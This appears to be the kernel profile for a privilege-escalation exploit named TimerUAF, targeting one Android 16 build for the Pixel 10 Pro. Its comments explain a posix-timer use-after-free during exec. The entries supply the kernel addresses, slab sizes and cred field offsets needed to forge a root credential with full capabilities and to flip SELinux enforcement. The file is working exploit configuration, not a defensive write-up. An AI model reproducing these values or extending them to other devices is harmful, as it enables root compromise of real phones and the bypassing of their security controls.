# TimerUAF kernel profile (HOCON; JSON remains valid)
# Device: Google Pixel 10 Pro (blazer); Pixel 10 Pro XL (mustang) ships the
#         same signed build but its own image was not compared
# Build : CP4A.261105.040.A1 (Android 16 QPR2, November 2026 security update)
# Kernel: 6.12.81-android16-6-g4a1a020d156e-ab16388316-4k (4K pages)
#
# Constants are from the factory boot.img of that exact build:
#   boot.img        sha256 1de8708d83ee5f39c1717ee7cf1d5d3098e25874982157ffd3a34653a6cca792
#   kernel (LZ4 in) sha256 23337758d842c8babd0c97d68e54c2db871aa19adbe6dd05ded635467079c56d
#   Image (raw)     sha256 e0c7240d40436d94000dcbae4dfd4a17ff67201021cdce019a46e5a9e9989e8c
#   timer_site          alloc_posix_timer: bl kmem_cache_alloc_noprof at
#                       +0x24, returns to +0x28 (x0 = posix_timers_cache).
#                       The second bl at +0x98 is the alloc-tag profiling path
#                       (it swaps current->alloc_tag around the call) - not it.
#   copy_process_low21  copy_process inlines dup_task_struct: the first
#                       kmem_cache_alloc_node_noprof (x0 = task_struct_cachep)
#                       returns to +0x144; the later one at +0xe2c is the
#                       alloc-tag path.
#   selinux_state       kallsyms, struct base; BTF puts `enforcing` at bit 0
#                       and selinux_state-8 is avc_latest_notif_update.notif_lock
#   arch_task_struct_size = 5184 (BTF sizeof task_struct) + 784 from
#                       android_arch_task_struct_size=784 in vendor_boot's
#                       vendor command line, hence the 0x1750 object size
#
# Vulnerability: fs/exec.c begin_new_exec() still calls
# posix_cpu_timers_exit() before exit_itimers(), i.e. the cleanup that later
# kernels moved ahead of de_thread() has not been backported here:
#   exec_task_namespaces -> posix_cpu_timers_exit -> exit_itimers
release = "6.12.81-android16-6-g4a1a020d156e-ab16388316-4k"
schema_version = 1
ksu_kmi = "android16-6.12"

page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# alloc_posix_timer -> kmem_cache_alloc_noprof(posix_timers_cache) call site.
#   ffffffc0802c9398: bl kmem_cache_alloc_noprof
#   return address = ffffffc0802c939c
timer_site = 0xffffffc0802c939c
timer_alloc = 0x100

# cred_jar: sizeof(struct cred)=0xb8, slab object=0xc0.
# cred_init: mov w1,#0xb8 / SLAB_HWCACHE_ALIGN -> ALIGN(0xb8,64)=0xc0
cred_req = 0xb8
cred_alloc = 0xc0
cred_size = 0xb8
# cred is `atomic_long_t usage` (8 bytes), so uid is at +0x8.
cred_uid_off = 0x8
cred_euid_off = 0x18
cred_cap_off = 0x30
cred_cap_count = 5
cred_security_off = 0x80
cred_user_off = 0x88
cred_userns_off = 0x90
cred_ucounts_off = 0x98
cred_group_off = 0xa0
# Distance from the stale k_itimer rb_node to the fake cred base.
fake_cred_off = 0x18

# link-time symbols (kallsyms)
selinux_state = 0xffffffc0828eb9a8
panic_on_warn = 0xffffffc08263ade0

# task_struct / cred layout (BTF)
task_cred_off = 0x900
copy_process_low21 = 0xc9f78
# 0x1440 (BTF sizeof task_struct) + 0x310 (bootconfig vendor extension)
task_alloc_bytes = 0x1750

# capability and fake-cred refcounted sub-objects
fullcap = 0x1ffffffffff
root_user = 0xffffffc082662348
init_user_ns = 0xffffffc0826620d0
init_ucounts = 0xffffffc082663ce0
init_groups = 0xffffffc082663810

# task_security_struct
# LSM order is "landlock,...,safesetid,selinux,...,bpf" with capability
# first, so the aggregate cred blob is landlock[0x0..0x8) then selinux[0x8..).
selinux_blob_off = 0x8
selinux_sid_kernel = 1
